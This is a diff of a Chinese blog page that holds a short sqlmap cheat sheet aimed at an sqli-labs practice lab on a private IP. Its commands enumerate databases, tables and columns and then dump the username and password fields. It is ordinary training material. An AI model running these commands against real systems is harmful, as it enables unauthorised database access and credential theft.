@@ -84,8 +84,6 @@
 
 
 
-  
-
 
   <link rel="alternate" href="/atom.xml" title="Sanstyle" type="application/atom+xml" />
 
@@ -107,7 +105,7 @@
 <meta property="og:site_name" content="Sanstyle">
 <meta property="og:description" content="查询数据库中信息的sqlmap语句 SQLMAP读取数据：   -u 漏洞url-data “vul” POST内容  –dbs 罗列所有数据库  -D 指定数据库  –tables列表  -D 指定数据库  -T 指定表 –columns 列所有字段  -D 指定数据库  -T 指定表 -C 指定字段 –dump 获取数据  –random-agent 随机ua头  –level -risk 设">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2017-08-30T12:49:37.909Z">
+<meta property="og:updated_time" content="2017-08-31T12:45:27.339Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLMAP提数据">
 <meta name="twitter:description" content="查询数据库中信息的sqlmap语句 SQLMAP读取数据：   -u 漏洞url-data “vul” POST内容  –dbs 罗列所有数据库  -D 指定数据库  –tables列表  -D 指定数据库  -T 指定表 –columns 列所有字段  -D 指定数据库  -T 指定表 -C 指定字段 –dump 获取数据  –random-agent 随机ua头  –level -risk 设">
@@ -397,15 +395,15 @@
 <li>-u 漏洞url-data “vul” POST内容<br>  –dbs 罗列所有数据库<br>  -D 指定数据库  –tables列表<br>  -D 指定数据库  -T 指定表 –columns 列所有字段<br>  -D 指定数据库  -T 指定表 -C 指定字段 –dump 获取数据<br>  –random-agent 随机ua头<br>  –level -risk 设置扫描等级</li>
 </ul>
 <ul>
-<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ –dbs<br>查询数据库</p>
+<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ - -dbs<br>查询数据库</p>
 </li>
-<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ –current-db<br>查询当前使用的数据库</p>
+<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ - -current-db<br>查询当前使用的数据库</p>
 </li>
-<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ -D security –tables<br>查询所有的表</p>
+<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ -D security - -tables<br>查询所有的表</p>
 </li>
-<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ -D security -T users –columns<br>查询表中所有字段</p>
+<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ -D security -T users - -columns<br>查询表中所有字段</p>
 </li>
-<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ -D security -T users -C username,password –dump<br>指定查询的列</p>
+<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ -D security -T users -C username,password - -dump<br>指定查询的列</p>
 </li>
 </ul>
 </blockquote>
